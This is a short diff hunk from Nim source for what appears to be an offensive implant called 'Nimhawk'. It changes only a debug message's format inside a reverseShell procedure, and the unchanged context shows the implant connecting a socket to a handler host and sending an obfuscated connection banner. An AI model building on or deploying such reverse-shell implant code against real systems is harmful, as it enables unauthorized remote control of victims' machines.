@@ -24,7 +24,7 @@ proc reverseShell*(args: seq[string]): string =
             socket.connect(host, Port(port))
             
             when defined verbose:
-                echo obf("DEBUG: Connected to reverse shell handler")
+                echo obf("[DEBUG]: Connected to reverse shell handler")
             
             # Send initial banner
             socket.send(obf("Nimhawk Reverse Shell Connected\n"))
